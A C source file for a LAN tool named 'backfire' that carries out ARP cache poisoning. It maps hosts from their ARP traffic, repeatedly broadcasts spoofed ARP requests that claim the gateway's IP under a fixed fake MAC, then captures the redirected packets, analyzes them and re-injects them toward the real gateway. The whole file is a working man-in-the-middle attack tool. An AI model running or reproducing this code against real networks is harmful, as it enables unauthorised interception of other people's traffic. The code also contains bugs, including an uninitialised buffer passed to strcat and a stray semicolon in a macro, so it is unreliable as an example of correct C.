#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <pcap/pcap.h>

#include "formats.h"
#include "analyzer.h"
#include "libs/uthash/uthash.h"

#define TRUE 1
#define FALSE 0
#define FAIL 2

#define BUFFSIZE 65535;
#define C_PACKETBUFFER_TM 256 // Customs handler packet buffer timeout
#define P_PACKETBUFFER_TM 1   // Poison handler packet buffer timeout

#define DEBUG { printf("DEBUG at line:%d\n", __LINE__); }


// ----- ----- STRUCTS ----- ----- //
// Structure used to encapsulate threads' arguments
struct _ThreadArgs {
  pcap_t** captureHandler;
  char* targetDev;
  int snaplen;
  int promisc;
  int packetBufferTm;
  char *filterExp;
  bpf_u_int32 devMask; // device mask
  void* callback;
};
typedef struct _ThreadArgs ThreadArgs;

// Structure used to map network's host IP
struct _HostMapEntry {
  unsigned char ipAddress[4];

  unsigned long ID;
  UT_hash_handle hh; /* makes this structure hashable */
};
typedef struct _HostMapEntry HostMapEntry;


// ----- ----- GLOBALS ----- ----- //
extern int errno;
char gErrbuf[PCAP_ERRBUF_SIZE]; // pcap error buffer

// Pcap's handlers and device used to sniff
char* gTargetDev = NULL;
pcap_t* gPoisongHandler;
pcap_t* gGatekeeperHandler;

// Network basic informations
char gGatewayIP[20]  = "192.168.1.1";
unsigned char gGatewayMAC[6];
const unsigned char gSpoofedMAC[6] = {0x3c, 0x5a, 0xb4, 0x88, 0x88, 0x88};

uint8_t* gArpSpoofRequest; // The ARP request used to poison caches

// Hash table used to map network's hosts
HostMapEntry* gHostsMap = NULL; // Declaring hashtable
pthread_mutex_t gHostMapLock = PTHREAD_MUTEX_INITIALIZER;

// Termination condition
int gTerminate = FALSE;
pthread_mutex_t gTerminationLock = PTHREAD_MUTEX_INITIALIZER;


// ----- ----- FUNCTION DEFINITIONS ----- ----- //
// Prints the usage
void  PrintUsage();
// Setup several global variables and initializes almost all 'gArpSpoofRequest' fields
void setup();
// Toggles 'gTerminate' value to TRUE on SIGINT interruption
void  SigIntHandler(int signum);
// Parses the 'policy.txt' file
char* PolicyParser(char* filename);
// Sends a spoofed arp request (IP: gateway IP / MAC: spoofed MAC) to each host discovered in the network
void  Spoof();
// Initializes and handle a pcaploop
void* pcapLoop(void *vargp);
// Updates HostMap hash table using arp's src protocol address
void  HostMapping(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes);
// Capture analyzes and filter traffic
void  Gatekeeper(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes);


// ----- ----- ARGUMENT PARSING ----- ----- //
int parseUArgs(int argc, char const *argv[]) {
  int opt;
  int gotGatewayMAC = FALSE;
  while ((opt = getopt(argc, (char *const *) argv, "i:a:d:h")) != -1) {
      switch (opt) {
      case 'i': {
        strcpy(gGatewayIP, optarg);
        break;
      }
      case 'a': {
        if(stringToMAC(optarg, gGatewayMAC) != 0) {
          printf("Wrong mac address format\n");
          return -1;
        }
        gotGatewayMAC = TRUE;
        break;
      }
      case 'd': {
        gTargetDev = optarg;
        break;
      }
      case 'h': {
        PrintUsage();
        exit(0);
      }
      default:
        fprintf(stderr, "Usage: %s [-i:a:h] [something...]\n", argv[0]);
        exit(EXIT_FAILURE);
      }
  }

  if(gotGatewayMAC==FALSE) {
    printf("-a isn't optional, -h for help\n");
    return -1;
  }
  else if(gTargetDev==NULL) {
    printf("No device specified, -h for help\n");
    return -1;
  }
  else return 0;
}


// ----- ----- MAIN ----- ----- //
int main(int argc, char const *argv[]) {
  // ----- Initialization ----- //
  // Parsing policy file
  if(parseUArgs(argc, argv) == -1) return -1;
  char* policies = PolicyParser("policy.txt");

  setup();

  // Checking root permissions
  if(geteuid() != 0) {
    fprintf(stderr, "Permission denied\n");
    return FAIL;
  }

  // Retrieving device info
  bpf_u_int32 devIP;   // device ip address
  bpf_u_int32 devMask; // device mask
  if(pcap_lookupnet(gTargetDev, &devIP, &devMask, gErrbuf) != 0) {
    fprintf(stderr, "Cannot retrieve informations for %s\n", gTargetDev);
    return FAIL;
  }

  signal(SIGINT, SigIntHandler); // CRTL-C termination

  // ----- Host Mapping ----- //
  // Preparing HostMapping filter expression
  char* poisonerFilter = malloc(200 * sizeof(char));
  strcpy(poisonerFilter, "ether src host not ");
  char aus[20]; stringFyMAC(aus, gSpoofedMAC);
  strcat(poisonerFilter, aus);
  strcat(poisonerFilter, " && arp && arp src host not 0.0.0.0 && arp src host not ");
  strcat(poisonerFilter, gGatewayIP);

  // Preparing HostMapping loop initializer arguments
  ThreadArgs* poisonArgs = malloc(sizeof(ThreadArgs));
  poisonArgs -> captureHandler = &gPoisongHandler;
  poisonArgs -> targetDev = gTargetDev;
  poisonArgs -> snaplen = BUFFSIZE;
  poisonArgs -> promisc = TRUE;
  poisonArgs -> packetBufferTm = 1;
  poisonArgs -> filterExp = poisonerFilter;
  poisonArgs -> devMask = devMask;
  poisonArgs -> callback = HostMapping;

  // Starting host mapping
  pthread_t poisonerTid;
  pthread_create(&poisonerTid, NULL, pcapLoop, (void*) poisonArgs);

  // ----- Gatekeeping ----- //
  // Preparing Gatekeeper filter expression
  char spoofedMac[18];
  stringFyMAC(spoofedMac, gSpoofedMAC);
  int policiesLength = (policies == NULL) ? 0 : strlen(policies);
  int filterLength = strlen(spoofedMac) + policiesLength + 150;
  char* gatekeeperFilter = malloc(filterLength * sizeof(char));

  strcat(gatekeeperFilter, "ether src not ");
  strcat(gatekeeperFilter, spoofedMac);
  strcat(gatekeeperFilter, " && ether dst ");
  strcat(gatekeeperFilter, spoofedMac);
  if(policies != NULL) {
    strcat(gatekeeperFilter, " && (");
    strcat(gatekeeperFilter, policies);
    strcat(gatekeeperFilter, ")");
    free(policies);
  }

  // Preparing Gatekeeper loop initializer arguments
  ThreadArgs* gatekeeperArgs = malloc(sizeof(ThreadArgs));
  gatekeeperArgs -> captureHandler = &gGatekeeperHandler;
  gatekeeperArgs -> targetDev = gTargetDev;
  gatekeeperArgs -> snaplen = BUFFSIZE;
  gatekeeperArgs -> promisc = TRUE;
  gatekeeperArgs -> packetBufferTm = 512;
  gatekeeperArgs -> filterExp = gatekeeperFilter;
  gatekeeperArgs -> devMask = devMask;
  gatekeeperArgs -> callback = Gatekeeper;

  // Starting the gatekeeper
  pthread_t gatekeeperTid;
  pthread_create(&gatekeeperTid, NULL, pcapLoop, (void*) gatekeeperArgs);

  // ----- Poisoning cycle ----- //
  while (TRUE) {
    // Termination condition
    pthread_mutex_lock(&gTerminationLock);
    int term = gTerminate;
    pthread_mutex_unlock(&gTerminationLock);
    if(term) break;

    // Spoofing then sleeping
    Spoof();
    usleep(500 * 1000);
  }

  // ----- Closing ----- //
  // Time to close, need stop threads
  if(gPoisongHandler != NULL) pcap_breakloop(gPoisongHandler);
  pthread_join(poisonerTid, NULL);

  if(gGatekeeperHandler != NULL) pcap_breakloop(gGatekeeperHandler);
  pthread_join(gatekeeperTid, NULL);

  cleanAnalyzer(); // Cleaning analyzer

  // Cleaning hosts hash map
  if(gHostsMap != NULL) {
    HostMapEntry *currentEntry, *tmp;

    HASH_ITER(hh, gHostsMap, currentEntry, tmp) {
      HASH_DEL(gHostsMap, currentEntry);
      free(currentEntry);
    }
  }

  printf("\nGlad to stop, sir.\n");
  return 0;
}


// ----- ----- ENVIRONMENT INITIALIZATION ----- ----- //
void setup() {
  // This variables have to be converted to network format
  ARP_REQUEST = htons(ARP_REQUEST);
  ARP_REPLY   = htons(ARP_REPLY);
  IP_PROTO    = htons(IP_PROTO);

  // Preparing spoofed request packet (see below for more info)
  unsigned char spoofIP[4];
  stringToIP(gGatewayIP, spoofIP);

  gArpSpoofRequest = (uint8_t*) malloc(ARP_SIZE);
  EthHeader* eth = (EthHeader*) gArpSpoofRequest;
  eth->type = htons(0x0806);
  memcpy(eth->dstAddr, ETH_BROADCAST, 6);
  memcpy(eth->srcAddr, gSpoofedMAC, 6);

  ArpMessage* arp = (ArpMessage*) (gArpSpoofRequest + 14);
  arp->operation = ARP_REQUEST;
  arp->hwType = htons(0x0001); arp->hwLength = (6);
  arp->prType = htons(0x0800); arp->prLenght = (4);

  memcpy(arp->srcPrAddr, spoofIP, 4);
  memcpy(arp->srcHwAddr, gSpoofedMAC, 6);
  memcpy(arp->dstHwAddr, ETH_BROADCAST, 6);
}
/*
 * * * * ARP SPOOF REQUEST PACKET FORMAT * *
 * OP:           request                    *
 * dst hardware: ETH_BROADCAST              *
 * src hardware: MAC used for spoofing      *
 * dst protocol: host mapping dependent     *
 * src protocol: target IP address          *
 * * * * * * * * * * * * * * * * * * * * * *
*/


// ----- ----- MISCELLANEOUS ----- ----- //
void PrintUsage() {
  printf("\
Usage: backfire [option]                                                       \n\
Option:                                                                        \n\
  -a [mac address]: gateway mac address to which sent resend captured packets  \n\
  -i [ip]         : target ip to spoof, default 192.168.1.1                    \n\
  -d [device]     : device from which capture and inject the traffic           \n\
  ");
  printf("\n");
}

void SigIntHandler(int signum) {
  pthread_mutex_lock(&gTerminationLock);
  gTerminate = TRUE;
  pthread_mutex_unlock(&gTerminationLock);
}

char* PolicyParser(char* filename) {
  FILE* fp;
  char* line = NULL;
  char* policy = NULL;
  size_t len = 0;
  ssize_t cread;

  fp = fopen(filename, "r");
  if (fp == NULL) return NULL;

  // Reading file line by line
  while ((cread = getline(&line, &len, fp)) != -1) {
    line[strlen(line)-1] = '\0';
    if(strcmp(line, "") == 0) continue;
    if(policy != NULL) {
      int totalSize = (strlen(policy) + cread + 7) * sizeof(char);
      policy = realloc(policy, totalSize);
      strcat(policy, " or (");
      strcat(policy, line);
      strcat(policy, ")");
    }
    else {
      // First line
      policy = malloc(cread * sizeof(char));
      strcpy(policy, line);
    }
  }

  // Cleaning and returning
  fclose(fp);
  if (line) free(line);
  return policy;
}


// ----- ----- LOOP INITIALIZER ----- ----- //
void cleanThreadEnv(ThreadArgs* args, pcap_t* handler, struct bpf_program* filter) {
  pthread_mutex_lock(&gTerminationLock);
  gTerminate = TRUE;
  pthread_mutex_unlock(&gTerminationLock);

  if(handler != NULL) {
    pcap_close(handler);
    pcap_freecode(filter);
  }
  free(args);
}

void *pcapLoop(void *vargp) {
  ThreadArgs* args = (ThreadArgs*) vargp;
  pcap_t* handler;
  struct bpf_program filter;

  // Creating and opening handler
  if((handler = pcap_open_live(args->targetDev, args->snaplen, args->promisc, args->packetBufferTm, gErrbuf)) == NULL) {
    fprintf(stderr, "Cannot create or open packet capture handle for %s\n", args->targetDev);
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }

  // Setting up global handler
  pcap_t** ghandler = args->captureHandler;
  *ghandler = handler;

  // Setting up filters
  if (pcap_compile(handler, &filter, args->filterExp, TRUE, args->devMask) == -1) {
    fprintf(stderr, "Something wrong while parsing filter \"%s\": %s\n", args->filterExp, pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }
	if (pcap_setfilter(handler, &filter) == -1) {
    fprintf(stderr, "Something wrong while installing filter \"%s\": %s\n", args->filterExp, pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
	}

  // Checking if something went wrong in the other thread
  pthread_mutex_lock(&gTerminationLock);
  int term = gTerminate;
  pthread_mutex_unlock(&gTerminationLock);
  if(term == TRUE) {
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }

  // Setting up callback and loopig
  int loopReturn = pcap_loop(handler, -1, args->callback, (unsigned char *) handler);
  if(loopReturn == -1) {
    fprintf(stderr, "Error while looping");
  }

  // Cleaning and returning
  cleanThreadEnv(args, handler, &filter);
  pthread_exit(NULL);
}


// ----- ----- POISONING && HOST MAPPING ----- ----- //
void Spoof() {
  ArpMessage* arp = (ArpMessage*) (gArpSpoofRequest + 14);

  // Looping throw all hash map entries
  pthread_mutex_lock(&gHostMapLock);
  for(HostMapEntry* host=gHostsMap; host!=NULL; host=(HostMapEntry*) host->hh.next) {
    memcpy(arp->dstPrAddr, host->ipAddress, 4);
    pcap_sendpacket(gPoisongHandler, gArpSpoofRequest, ARP_SIZE);
  }
  pthread_mutex_unlock(&gHostMapLock);
}

void HostMapping(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes) {
  ArpMessage* arpMsg = (ArpMessage*) (bytes + 14); // 14 Byte Ethernet header

  HostMapEntry* host;
  unsigned long hostID = hashString(arpMsg->srcPrAddr);

  // Checking if hash table needs to be update
  pthread_mutex_lock(&gHostMapLock);
  HASH_FIND_INT(gHostsMap, &hostID, host);
  if(host == NULL) {
    host = (HostMapEntry*) malloc(sizeof(HostMapEntry));
    host->ID = hostID;
    memcpy(host->ipAddress, arpMsg->srcPrAddr, 4);
    HASH_ADD_INT(gHostsMap, ID, host);
  }
  pthread_mutex_unlock(&gHostMapLock);
}


// ----- ----- GATEKEEPING ----- ----- //
void Gatekeeper(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes) {
  Analyze(h->caplen, bytes);

  // Rebuilding Ethernet frame
  EthHeader* eth = (EthHeader*) bytes;
  memcpy(eth->srcAddr, ETH_BROADCAST, 6);
  memcpy(eth->dstAddr, gGatewayMAC, 6);

  // Injecting
  int res = pcap_sendpacket(gGatekeeperHandler, bytes, h->len);
  if(res != 0) {
    fprintf(stderr, "Error while injecting: %s\n", pcap_geterr(gGatekeeperHandler));
  }
}
